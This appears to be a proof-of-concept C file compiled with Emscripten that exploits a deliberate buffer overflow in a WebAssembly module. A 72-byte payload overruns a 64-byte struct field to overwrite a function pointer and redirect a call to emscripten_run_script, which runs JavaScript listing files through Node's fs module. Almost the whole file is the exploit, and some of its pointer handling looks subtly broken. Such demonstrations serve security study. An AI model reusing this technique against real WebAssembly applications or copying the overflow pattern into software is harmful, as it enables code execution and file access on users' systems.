#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include <emscripten.h>

/* Represents a message and an output channel */
typedef struct Comms {
  char msg[64];
  uint16_t msg_len;
  void (*out)(const char *);
} Comms;

/* Conduct the communication by calling the function pointer with message. */
void trigger(Comms *comms) {
  comms->out(comms->msg);
}

void communicate(const char *msg) {
  printf("%s", msg);
}

EMSCRIPTEN_KEEPALIVE
int sup(void) {
  Comms comms;
  comms.out = &communicate;
  char *useless = &communicate; // 0x4
  *useless = &emscripten_run_script; // 0x5
  char *payload = "console.log(require('fs').readdirSync('./').toString());//" // 58 bytes
  "      " // + 6 to fill .msg = 64
  "  " // + 2 for alignment = 66
  "\x40\x00" // + 2 bytes to fill .msg_len = 68
  "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
  memcpy(comms.msg, payload, 72);

  trigger(&comms);

  return 0;
}
